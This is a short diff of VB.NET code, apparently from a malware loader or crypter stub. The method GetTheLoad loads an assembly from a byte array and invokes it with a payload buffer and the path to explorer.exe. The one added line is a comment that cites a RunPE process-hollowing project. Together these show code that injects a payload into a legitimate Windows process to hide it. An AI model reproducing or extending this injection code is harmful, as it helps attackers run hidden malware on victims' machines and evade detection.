@@ -78,6 +78,7 @@ Public Class Program
     End Function
 
     Public Shared Sub GetTheLoad(ByVal PL As Byte(), ByVal arg As String, ByVal buffer As Byte())
+	'RunPE https://github.com/gigajew/WinXRunPE-x86_x64
         Try
             Assembly.Load(PL).GetType("Project1.Program").GetMethod("Load", BindingFlags.Public Or BindingFlags.Static).Invoke(Nothing, New Object() {buffer, "C:\Windows\explorer.exe", arg})
         Catch ex As Exception
